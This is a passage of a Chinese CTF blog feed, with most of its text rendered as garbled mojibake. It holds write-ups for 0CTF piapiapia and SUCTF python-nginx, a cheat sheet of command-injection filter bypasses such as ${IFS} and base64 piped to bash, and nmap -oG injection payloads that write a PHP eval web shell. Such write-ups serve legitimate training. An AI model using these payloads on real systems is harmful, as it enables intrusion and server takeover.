alt="image-20211011014619609"></p><p>34ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥åº”è¯¥æœ‰34ä¸ªwhereæ¥é€ƒé€¸34ä¸ªå­—ç¬¦ã€‚</p><p>6*34=204</p><pre><code>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;15885248522&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/9f6e6800cfae7749eb6c486619254b9c&quot;;&#125;</code></pre><p>æ‰€ä»¥payloadå°±ä¸ºï¼š</p><pre><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre><p>åœ¨burpä¸­å°†nicknameç±»å‹æ”¹ä¸ºæ•°ç»„ï¼Œå¹¶ä¼ å…¥payload</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011015434242.png" alt="image-20211011015434242"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011015942962.png" alt="image-20211011015942962"></p><p>æŸ¥çœ‹æºä»£ç ï¼Œå¯å‘ç°base64åŠ å¯†</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011020008050.png" alt="image-20211011020008050"></p><p>è§£å¯†å³å¯å¾—åˆ°flag</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011020027430.png" alt="image-20211011020027430"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2019-python-nginx</title>
      <link href="/2021/10/10/SUCTF2019-python-nginx/"/>
      <url>/2021/10/10/SUCTF2019-python-nginx/</url>
      
        <content type="html"><![CDATA[<p>é¢˜ç›®æºç ï¼š</p><pre><code>@app.route(&#39;/getUrl&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;]) def getUrl():   url = request.args.get(&quot;url&quot;)   host = parse.urlparse(url).hostnameif host == &#39;suctf.cc&#39;:   return &quot;æˆ‘æ‰Œ your problem? 111&quot;parts = list(urlsplit(url)) host = parts[1]if host == &#39;suctf.cc&#39;:   return &quot;æˆ‘æ‰Œ your problem? 222 &quot; + host newhost = []for h in host.split(&#39;.&#39;):   newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))   parts[1] = &#39;.&#39;.join(newhost)  # å»æ‰ url ä¸­çš„ç©ºæ ¼   finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]   host = parse.urlparse(finalUrl).hostnameif host == &#39;suctf.cc&#39;:   return urllib.request.urlopen(finalUrl).read()else :  return &quot;æˆ‘æ‰Œ your problem? 333&quot;</code></pre><h1 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h1><p>è¯¥é¢˜çš„ä¸»è¦é—®é¢˜æ˜¯åœ¨</p><p>h.encode(â€˜idnaâ€™).decode(â€˜utf-8â€™)</p><p>IDNAå®é™…ä¸Šæ˜¯å›½é™…åŒ–åŸŸå</p><p>ä»€ä¹ˆæ˜¯IDN?</p><p>å›½é™…åŒ–åŸŸå(Internationalized Domain Name,IDN)åˆåç‰¹æ®Šå­—ç¬¦åŸŸåï¼Œæ˜¯æŒ‡éƒ¨åˆ†æˆ–å®Œå…¨ä½¿ç”¨ç‰¹æ®Šæ–‡å­—æˆ–å­—æ¯ç»„æˆçš„äº’è”ç½‘åŸŸåï¼ŒåŒ…æ‹¬ä¸­æ–‡ã€å‘è‚²ã€é˜¿æ‹‰ä¼¯è¯­ã€å¸Œä¼¯æ¥è¯­æˆ–æ‹‰ä¸å­—æ¯ç­‰éè‹±æ–‡å­—æ¯ï¼Œè¿™äº›æ–‡å­—ç»è¿‡å¤šå­—èŠ‚ä¸‡å›½ç ç¼–ç è€Œæˆã€‚åœ¨åŸŸåç³»ç»Ÿä¸­ï¼Œå›½é™…åŒ–åŸŸåä½¿ç”¨punycodeè½¬å†™å¹¶ä»¥ASCIIå­—ç¬¦ä¸²å­˜å‚¨ã€‚</p><p><img src="/2021/10/10/SUCTF2019-python-nginx/1.png"></p><p>Nginxé‡è¦é…ç½®æ–‡ä»¶ï¼š</p><pre><code>é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginxä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.confç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.serviceæ¨¡å—ï¼š/usr/lisb64/nginx/modulesåº”ç”¨ç¨‹åºï¼š/usr/sbin/nginxç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/htmlæ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginxé…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š/usr/local/nginx/conf/nginx.conf</code></pre><p>åˆ©ç”¨è„šæœ¬æ¥è·‘å¯ç”¨å­—ç¬¦ï¼š</p><pre><code class="#">for i in range(128,65537):        tmp=chr(i)        try:                res = tmp.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)                if(&quot;-&quot;) in res:                        continue                print(&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;.format(tmp, res, i))        except:                pass</code></pre><p><img src="/2021/10/10/SUCTF2019-python-nginx/3.png"><br>å‘ç°å¯åˆ©ç”¨å­—ç¬¦,è·å–flagï¼š<br><img src="/2021/10/10/SUCTF2019-python-nginx/2.png"></p><h1 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h1><p>åˆ©ç”¨ä¸¤æ­¤urlsplitæ¼æ´ï¼š<br>è¿™é“é¢˜ä¸èƒ½è®©ä»–ä¸ºsuctf.cc<br><img src="/2021/10/10/SUCTF2019-python-nginx/5.png"><br>ä½†æ˜¯ç»è¿‡äº† urlunsplit åå˜æˆ suctf.ccï¼Œå¾ˆå®¹æ˜“å°±æ„é€ å‡ºï¼šfile////:suctf.cc/usr/local/nginx/conf/nginx.confï¼Œè¿™æ ·å°±èƒ½è¯»å–æ–‡ä»¶äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åˆ·é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ‰§è¡Œ</title>
      <link href="/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>phpè°ƒç”¨å¤–éƒ¨ç¨‹åºå¸¸ç”¨çš„å‡½æ•°ï¼š<br>system()â€”æ‰§è¡Œshellå‘½ä»¤ä¹Ÿå°±æ˜¯å‘doså‘é€ä¸€æ¡æŒ‡ä»¤ã€‚<br>shell_exec() â€” é€šè¿‡ shell ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›ã€‚<br>exec() â€”æ‰§è¡Œå¤–éƒ¨ç¨‹åºã€‚<br>passthru() â€” æ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶ä¸”æ˜¾ç¤ºåŸå§‹è¾“å‡ºã€‚</p><p>ç»•è¿‡æŠ€å·§ï¼š</p><h1 id="å¸¸è§ç®¡é“ç¬¦"><a href="#å¸¸è§ç®¡é“ç¬¦" class="headerlink" title="å¸¸è§ç®¡é“ç¬¦"></a>å¸¸è§ç®¡é“ç¬¦</h1><pre><code class="php">â€˜|â€™ ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥â€˜||â€™ å¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥â€˜&amp;â€™ å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡&amp;&amp;å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤Linux:Linuxç³»ç»ŸåŒ…å«äº†windowsç³»ç»Ÿä¸Šé¢å››ä¸ªä¹‹å¤–ï¼Œè¿˜å¤šäº†ä¸€ä¸ª â€˜;â€™ è¿™ä¸ªä½œç”¨å’Œ â€˜&amp;â€™ ä½œç”¨ç›¸åŒ</code></pre><h1 id="ç©ºæ ¼ç»•è¿‡-ç©ºæ ¼è¢«è¿‡æ»¤"><a href="#ç©ºæ ¼ç»•è¿‡-ç©ºæ ¼è¢«è¿‡æ»¤" class="headerlink" title="ç©ºæ ¼ç»•è¿‡(ç©ºæ ¼è¢«è¿‡æ»¤"></a>ç©ºæ ¼ç»•è¿‡(ç©ºæ ¼è¢«è¿‡æ»¤</h1><pre><code class="php">&lt;  --  é‡å®šå‘ï¼Œå¦‚cat&lt;flag.php&lt;&gt;      --   é‡å®šå‘ï¼Œå¦‚cat&lt;&gt;flag.php%09  --  éœ€è¦phpç¯å¢ƒï¼Œå¦‚cat%09flag.php$&#123;IFS&#125;  --  å•çº¯cat$IFS2,IFS2è¢«bashè§£é‡Šå™¨å½“åšå˜é‡åï¼Œè¾“ä¸å‡ºæ¥ç»“æœï¼ŒåŠ ä¸€ä¸ª&#123;&#125;å°±å›ºå®šäº†å˜é‡åï¼Œå¦‚cat$&#123;IFS2&#125;flag.php$IFS$9  --  åé¢åŠ ä¸ª$ä¸&#123;&#125;ç±»ä¼¼ï¼Œèµ·æˆªæ–­ä½œç”¨ï¼Œ$9æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹ç¬¬ä¹ä¸ªå‚æ•°æŒæœ‰è€…ï¼Œå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå¦‚cat$IFS2$9flag.php</code></pre><h1 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h1><h2 id="æ‹¼æ¥"><a href="#æ‹¼æ¥" class="headerlink" title="æ‹¼æ¥"></a>æ‹¼æ¥</h2><pre><code class="php">a=c;b=at;c=flag;$a$b $ca=c;b=at;c=heb;d=ic;ab&#123;c&#125;&#123;d&#125;</code></pre><h2 id="base64ç¼–ç "><a href="#base64ç¼–ç " class="headerlink" title="base64ç¼–ç "></a>base64ç¼–ç </h2><pre><code class="php">echo MTIzCg==|base64 -d å…¶å°†ä¼šæ‰“å°123echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash ==&gt;cat /flag</code></pre><h2 id="hexç¼–ç "><a href="#hexç¼–ç " class="headerlink" title="hexç¼–ç "></a>hexç¼–ç </h2><pre><code class="php">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag</code></pre><h2 id="å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡"><a href="#å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡" class="headerlink" title="å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡"></a>å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡</h2><pre><code class="php">ca&#39;&#39;t flag æˆ–ca&quot;&quot;t flagca&#39;&#39;t te&quot;&quot;st.php</code></pre><h2 id="åæ–œæ ç»•è¿‡"><a href="#åæ–œæ ç»•è¿‡" class="headerlink" title="åæ–œæ ç»•è¿‡"></a>åæ–œæ ç»•è¿‡</h2><pre><code class="php">ca\t fl\agcat te\st.php</code></pre><h2 id="ç»•è¿‡ipä¸­çš„å¥ç‚¹"><a href="#ç»•è¿‡ipä¸­çš„å¥ç‚¹" class="headerlink" title="ç»•è¿‡ipä¸­çš„å¥ç‚¹"></a>ç»•è¿‡ipä¸­çš„å¥ç‚¹</h2><pre><code class="php">ç½‘ç»œåœ°å€å¯ä»¥è½¬æ¢æˆæ•°å­—åœ°å€ï¼Œæ¯”å¦‚127.0.0.1å¯ä»¥è½¬åŒ–ä¸º2130706433ã€‚å¯ä»¥ç›´æ¥è®¿é—®http://2130706433æˆ–è€…http://0x7F000001ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡.çš„ipè¿‡æ»¤ã€‚åœ¨çº¿è½¬æ¢åœ°å€ï¼šæ•°å­—è½¬IPåœ°å€ IPåœ°å€è½¬æ•°å­— åŸŸåè½¬æ•°å­—IP</code></pre><h1 id="ç»•è¿‡é•¿åº¦é™åˆ¶"><a href="#ç»•è¿‡é•¿åº¦é™åˆ¶" class="headerlink" title="ç»•è¿‡é•¿åº¦é™åˆ¶"></a>ç»•è¿‡é•¿åº¦é™åˆ¶</h1><h2 id="é€šè¿‡-gt-æ¥åˆ›å»ºæ–‡ä»¶"><a href="#é€šè¿‡-gt-æ¥åˆ›å»ºæ–‡ä»¶" class="headerlink" title="é€šè¿‡&gt;æ¥åˆ›å»ºæ–‡ä»¶"></a>é€šè¿‡&gt;æ¥åˆ›å»ºæ–‡ä»¶</h2><pre><code class="php">&gt;flag.txt</code></pre><h2 id="é€šè¿‡-gt-å°†å‘½ä»¤ç»“æœå­˜å…¥æ–‡ä»¶ä¸­"><a href="#é€šè¿‡-gt-å°†å‘½ä»¤ç»“æœå­˜å…¥æ–‡ä»¶ä¸­" class="headerlink" title="é€šè¿‡&gt;å°†å‘½ä»¤ç»“æœå­˜å…¥æ–‡ä»¶ä¸­"></a>é€šè¿‡&gt;å°†å‘½ä»¤ç»“æœå­˜å…¥æ–‡ä»¶ä¸­</h2><pre><code class="php">echo &quot;hello hacker&quot; &gt; flag.txt</code></pre><h2 id="gt-gt-ç¬¦å·çš„ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶å†…å®¹æœ«å°¾ï¼Œä¸ä¼šè¦†ç›–åŸå†…å®¹"><a href="#gt-gt-ç¬¦å·çš„ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶å†…å®¹æœ«å°¾ï¼Œä¸ä¼šè¦†ç›–åŸå†…å®¹" class="headerlink" title="&gt;&gt;ç¬¦å·çš„ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶å†…å®¹æœ«å°¾ï¼Œä¸ä¼šè¦†ç›–åŸå†…å®¹"></a>&gt;&gt;ç¬¦å·çš„ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶å†…å®¹æœ«å°¾ï¼Œä¸ä¼šè¦†ç›–åŸå†…å®¹</h2><pre><code class="php">echo &quot;hello hacker&quot; &gt;&gt; flag.txt</code></pre><h2 id="Linuxä¸­å‘½ä»¤æ¢è¡Œ"><a href="#Linuxä¸­å‘½ä»¤æ¢è¡Œ" class="headerlink" title="Linuxä¸­å‘½ä»¤æ¢è¡Œ"></a>Linuxä¸­å‘½ä»¤æ¢è¡Œ</h2><p>åœ¨Linuxä¸­ï¼Œå½“æˆ‘ä»¬æ‰§è¡Œæ–‡ä»¶ä¸­çš„å‘½ä»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬é€šè¿‡åœ¨æ²¡æœ‰å†™å®Œçš„å‘½ä»¤åé¢åŠ \ï¼Œå¯ä»¥å°†ä¸€æ¡å‘½ä»¤å†™åœ¨å¤šè¡Œã€‚<br>æ¯”å¦‚ï¼šcat flag</p><pre><code class="php">ca\t\ fla\g.txtå°†å‘½ä»¤ä¸€æ¡ä¸€æ¡è¾“å…¥ä¸€ä¸ªæ–‡æœ¬ä¸­å†æ‰§è¡Œ:root@kali:~# echo &quot;ca\\&quot;&gt;cmdroot@kali:~# echo &quot;t\\&quot;&gt;&gt;cmdroot@kali:~# echo &quot; fl\\&quot;&gt;&gt;cmdroot@kali:~# echo &quot;ag&quot;&gt;&gt;cmdroot@kali:~# cat cmdca\t\ fl\agroot@kali:~# sh cmdthis is your flag</code></pre><h2 id="lså‘½ä»¤"><a href="#lså‘½ä»¤" class="headerlink" title="lså‘½ä»¤"></a>lså‘½ä»¤</h2><pre><code class="php">ls -a åˆ—å‡ºæ–‡ä»¶ä¸‹æ‰€æœ‰çš„æ–‡ä»¶ï¼ŒåŒ…æ‹¬ä»¥â€œ.â€œå¼€å¤´çš„éšè—æ–‡ä»¶ï¼ˆlinuxä¸‹æ–‡ä»¶éšè—æ–‡ä»¶æ˜¯ä»¥.å¼€å¤´çš„ï¼Œå¦‚æœå­˜åœ¨..ä»£è¡¨å­˜åœ¨ç€çˆ¶ç›®å½•ï¼‰ã€‚ls -l åˆ—å‡ºæ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¦‚åˆ›å»ºè€…ï¼Œåˆ›å»ºæ—¶é—´ï¼Œæ–‡ä»¶çš„è¯»å†™æƒé™åˆ—è¡¨ç­‰ç­‰ã€‚ls -F åœ¨æ¯ä¸€ä¸ªæ–‡ä»¶çš„æœ«å°¾åŠ ä¸Šä¸€ä¸ªå­—ç¬¦è¯´æ˜è¯¥æ–‡ä»¶çš„ç±»å‹ã€‚&quot;@&quot;è¡¨ç¤ºç¬¦å·é“¾æ¥ã€&quot;|&quot;è¡¨ç¤ºFIFOSã€&quot;/&quot;è¡¨ç¤ºç›®å½•ã€&quot;=&quot;è¡¨ç¤ºå¥—æ¥å­—ã€‚ls -s åœ¨æ¯ä¸ªæ–‡ä»¶çš„åé¢æ‰“å°å‡ºæ–‡ä»¶çš„å¤§å°ã€‚ size(å¤§å°)ls -t æŒ‰æ—¶é—´è¿›è¡Œæ–‡ä»¶çš„æ’åº Time(æ—¶é—´)ls -A åˆ—å‡ºé™¤äº†&quot;.&quot;å’Œ&quot;..&quot;ä»¥å¤–çš„æ–‡ä»¶ã€‚ls -R å°†ç›®å½•ä¸‹æ‰€æœ‰çš„å­ç›®å½•çš„æ–‡ä»¶éƒ½åˆ—å‡ºæ¥ï¼Œç›¸å½“äºæˆ‘ä»¬ç¼–ç¨‹ä¸­çš„â€œé€’å½’â€å®ç°ls -L åˆ—å‡ºæ–‡ä»¶çš„é“¾æ¥åã€‚Linkï¼ˆé“¾æ¥ï¼‰ls -S ä»¥æ–‡ä»¶çš„å¤§å°è¿›è¡Œæ’åº</code></pre><h1 id="å„ç§è¯»æ–‡ä»¶å‘½ä»¤"><a href="#å„ç§è¯»æ–‡ä»¶å‘½ä»¤" class="headerlink" title="å„ç§è¯»æ–‡ä»¶å‘½ä»¤"></a>å„ç§è¯»æ–‡ä»¶å‘½ä»¤</h1><pre><code class="php">cat--ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡ºtac--ä»æœ€åä¸€è¡Œå€’åºæ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡ºmore-- æ ¹æ®çª—å£å¤§å°ï¼Œä¸€é¡µä¸€é¡µçš„ç°å®æ–‡ä»¶å†…å®¹less å’Œmoreç±»ä¼¼ï¼Œä½†å…¶ä¼˜ç‚¹å¯ä»¥å¾€å‰ç¿»é¡µï¼Œè€Œä¸”è¿›è¡Œå¯ä»¥æœç´¢å­—ç¬¦head-- åªæ˜¾ç¤ºå¤´å‡ è¡Œtail --åªæ˜¾ç¤ºæœ€åå‡ è¡Œnl --ç±»ä¼¼äºcat -nï¼Œæ˜¾ç¤ºæ—¶è¾“å‡ºè¡Œå·tailf-- ç±»ä¼¼äºtail -fvim --ä½¿ç”¨vimå·¥å…·æ‰“å¼€æ–‡æœ¬vi --ä½¿ç”¨viæ‰“å¼€æ–‡æœ¬cat ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>escapeshellarg+escapeshellcmd å‡½æ•°æ¼æ´</title>
      <link href="/2021/10/08/escapeshellarg+escapeshellcmd%20%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/10/08/escapeshellarg+escapeshellcmd%20%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p> escapeshellarg(string $arg): string<br>escapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦ ã€‚<br>escapeshellcmd<br> escapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚</p><p>åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A å’Œ \xFFã€‚ â€˜ å’Œ â€œ ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚ </p><p>è¿™ä¸¤ä¸ªå‡½æ•°åœ¨ä¸€èµ·ç”¨ä¼šæœ‰äº›é—®é¢˜.PS:å…ˆç”¨escapeshellargå†ç”¨escapeshellcmdæ‰ä¼šæœ‰è¿™ä¸ªé—®é¢˜<br>ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š172.17.0.2â€™ -v -d a=1<br>ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†â€™172.17.0.2â€™&#39;â€˜ -v -d a=1â€™ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚<br>ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆâ€™172.17.0.2â€™\â€˜â€™ -v -d a=1&#39;ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼š<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a><br>æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl â€˜172.17.0.2â€™\â€˜â€™ -v -d a=1&#39;ï¼Œç”±äºä¸­é—´çš„\è¢«è§£é‡Šä¸º\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„â€™æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„â€™é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\ -v -d a=1â€™ï¼Œå³å‘172.17.0.2\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa=1â€™ã€‚</p><p>ä¸¤æ¬¡è½¬è¯‘åå‡ºç°äº†é—®é¢˜ï¼Œæ²¡æœ‰è€ƒè™‘åˆ°å•å¼•å·çš„é—®é¢˜</p><p>nmapå‘½ä»¤ä¸­ æœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶<br>?host=â€™ <?php @eval($_POST["hack"]);?> -oG hack.php â€˜</p><p>æ€»ç»“å½“ä¸¤ä¸ªå‡½æ•°æŒ‰è¿™æ ·é¡ºåºä¸€èµ·ä½¿ç”¨ï¼Œä½¿ç”¨è¿‡æ»¤å°±æ²¡æœ‰æ„ä¹‰äº†</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‡½æ•° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmapç»“åˆä»£ç æ‰§è¡Œ</title>
      <link href="/2021/10/08/Nmap%E6%96%B9%E9%9D%A2%E7%9A%84%E8%80%83%E5%AF%9F/"/>
      <url>/2021/10/08/Nmap%E6%96%B9%E9%9D%A2%E7%9A%84%E8%80%83%E5%AF%9F/</url>
      
        <content type="html"><![CDATA[<p>é€‰é¡¹ è§£é‡Š<br>-oN æ ‡å‡†ä¿å­˜<br>-oX XMLä¿å­˜<br>-oG Grepä¿å­˜<br>-oA ä¿å­˜åˆ°æ‰€æœ‰æ ¼å¼<br>-append-output è¡¥å……ä¿å­˜æ–‡ä»¶<br>-F å®è¡Œä¸€æ¬¡å¿«é€Ÿæ‰«æ<br>é€‰é¡¹-oG<br>å°†ç»“æœGrepä¿å­˜<br>nmap -F -oG test.txt 192.168.23.1<br>nmapå‘½ä»¤ä¸­ æœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶<br>?host=â€™ <?php @eval($_POST["hack"]);?> -oG hack.php â€˜<br>ä¼ å…¥çš„å‚æ•°ç»è¿‡äº†escapeshellargä¸escapeshellcmdä¸¤ä¸ªå‡½æ•°çš„å¤„ç†ï¼Œå¯¼è‡´åœ¨hack.phpâ€™è¿™æ ·çš„æƒ…å†µä¸‹ä¼šäº§ç”Ÿhack.php\,è§£å†³åŠæ³•å°±æ˜¯åœ¨å•å¼•å·å‰åŠ ç©ºæ ¼</p><p>é€‰é¡¹-oA<br>è¯¥é€‰é¡¹å¯å°†æ‰«æç»“æœä»¥æ ‡å‡†æ ¼å¼ã€XMLæ ¼å¼å’ŒGrepæ ¼å¼ä¸€æ¬¡æ€§ä¿å­˜ï¼Œåˆ†åˆ«æ”¾åœ¨.nmapï¼Œ.xmlå’Œ.gnmapæ–‡ä»¶ä¸­ã€‚<br>nmap -F -oA test 192.168.3.2</p><p>â€˜ -oN b.phtml <?=eval(\$_POST[a]);?>â€˜</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç æ‰§è¡Œ,nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5ç¢°æ’è„šæœ¬</title>
      <link href="/2021/10/08/md5%E7%A2%B0%E6%92%9E%E8%84%9A%E6%9C%AC/"/>
      <url>/2021/10/08/md5%E7%A2%B0%E6%92%9E%E8%84%9A%E6%9C%AC/</url>
      
